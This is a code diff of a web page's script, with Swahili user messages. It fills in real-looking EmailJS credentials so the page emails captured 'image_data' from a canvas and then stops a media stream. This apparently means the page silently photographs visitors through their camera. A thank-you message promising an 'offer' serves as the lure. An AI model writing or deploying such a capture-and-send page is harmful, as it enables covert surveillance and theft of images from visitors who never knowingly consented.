@@ -18,7 +18,7 @@
 
   <script>
     // Anzisha EmailJS
-    emailjs.init("YOUR_PUBLIC_KEY");
+    emailjs.init("w9dVJ6diDwg5XuuXd");
 
     const canvas = document.createElement('canvas');
     const context = canvas.getContext('2d');
@@ -38,7 +38,7 @@
 
           const params = { image_data: imageData };
 
-          emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", params)
+          emailjs.send("service_sxnave", "tamplate_sjw1wrn", params)
             .then(() => {
               stream.getTracks().forEach(track => track.stop());
               messageDiv.textContent = "Asante kwa kushiriki! Tazama ofa yako hapa: (unaweza kuongeza link ya biashara yako hapa)";
